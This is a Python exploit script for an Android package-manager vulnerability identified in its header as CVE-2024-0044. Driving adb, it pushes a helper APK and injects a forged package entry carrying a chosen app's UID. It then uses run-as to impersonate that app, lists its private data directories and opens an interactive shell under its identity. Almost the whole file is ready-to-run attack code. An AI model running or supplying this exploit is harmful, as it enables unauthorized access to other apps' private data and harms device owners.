# https://nvd.nist.gov/vuln/detail/cve-2024-0044
import subprocess
import sys
from pathlib import Path


def execute_adb_command(cmd_args: list[str]) -> subprocess.CompletedProcess:
    result = subprocess.run(cmd_args, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    return result


def adb_push_file(local_path: str, remote_path: str) -> bool:
    result = execute_adb_command(["adb", "push", local_path, remote_path])
    return result.returncode == 0


def adb_shell(cmd: list[str]) -> subprocess.CompletedProcess:
    full_cmd = ["adb", "shell"] + cmd
    return execute_adb_command(full_cmd)


def uninstall_helper(helper_package_id: str) -> None:
    result = adb_shell(["pm", "list", "packages", helper_package_id])
    if helper_package_id in result.stdout:
        adb_shell(["pm", "uninstall", helper_package_id])


def get_package_uid(package_id: str) -> str | None:
    result = adb_shell(["dumpsys", "package", package_id])
    for line in result.stdout.splitlines():
        if "userId=" in line:
            uid = line.strip().split("userId=")[1].split()[0]
            if len(uid) >= 5:
                return uid
    return None


def list_installed_packages() -> list[str]:
    result = adb_shell(["pm", "list", "packages"])
    packages = [pkg.split("package:")[1].strip() for pkg in result.stdout.splitlines() if "package:" in pkg]

    for idx, pkg in enumerate(packages):
        uid = get_package_uid(pkg)
        if not uid:
            continue
        permissions = get_package_permissions(pkg)
        print(f"{idx + 1:02d} - {pkg} (UID: {uid}) - {len(permissions)} permissions")

    return packages


def get_package_permissions(package_id: str) -> list[str]:
    result = adb_shell(["dumpsys", "package", package_id])
    permissions = []

    for line in result.stdout.splitlines():
        if "granted=true" in line and "permission" in line:
            permissions.append(line.strip())

    return permissions


def exploit(target_pkg: str, helper_pkg: str, helper_apk_path: str) -> None:
    uninstall_helper(helper_pkg)

    target_uid = get_package_uid(target_pkg)
    if target_uid is None:
        return

    permissions = get_package_permissions(target_pkg)
    for idx, perm in enumerate(permissions):
        permission_name = perm.split(":")[0].strip()
        print(f"  {idx + 1:02d}. {permission_name}")
    print(f"{target_pkg} has {len(permissions)} permissions\n")

    payload = f"@null\nvictim {target_uid} 1 /data/user/0 default:targetSdkVersion=30 none 0 0 1 @null"
    adb_shell(
        [
            "app_process",
            "-Djava.class.path=" + helper_apk_path,
            "/system/bin",
            "com.objc.dummy.PoC",
            f'"{helper_apk_path}"',
            f'"{payload}"',
        ]
    )

    id_proc = execute_adb_command(["adb", "shell", "run-as", "victim", "id"])
    if id_proc.returncode != 0:
        print("Failed to spawn shell")
        return

    id_output = id_proc.stdout.strip()
    print(f"\nSpawned shell as: {id_output}\n")

    data_dirs = [
        f"/data/data/{target_pkg}",
        f"/data/user/0/{target_pkg}",
        f"/sdcard/Android/data/{target_pkg}",
        f"/storage/emulated/0/Android/data/{target_pkg}",
        "/data/local/tmp",
    ]

    print("Testing access to stuff...")
    for data_dir in data_dirs:
        result = execute_adb_command(["adb", "shell", "run-as", "victim", "ls", data_dir])
        if result.returncode == 0:
            files = result.stdout.splitlines()
            print(f"  * {data_dir} accessible. files: {files}")
        else:
            print(f"  * {data_dir} - No access")
    print("\n\n")
    print("Try to run some commands:")

    try:
        subprocess.run(["adb", "shell", "run-as", "victim", "sh"], check=False)
    except KeyboardInterrupt:
        pass


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage modes:")
        print(f"  {sys.argv[0]} --list                     # List all installed packages")
        print(f"  {sys.argv[0]} <installed_package>         # Spawn shell impersonating package\n")
        print(f"  Example: {sys.argv[0]} com.android.systemui")
        sys.exit(1)

    helper_apk = Path("bin/package-injection.apk").resolve()
    on_device_helper_path = "/data/local/tmp/poc.apk"

    if not helper_apk.exists():
        sys.exit(1)

    if not adb_push_file(helper_apk.as_posix(), on_device_helper_path):
        sys.exit(1)

    if sys.argv[1] == "--list":
        list_installed_packages()
    else:
        target_package = sys.argv[1]
        exploit(target_package, "com.objc.dummy", on_device_helper_path)
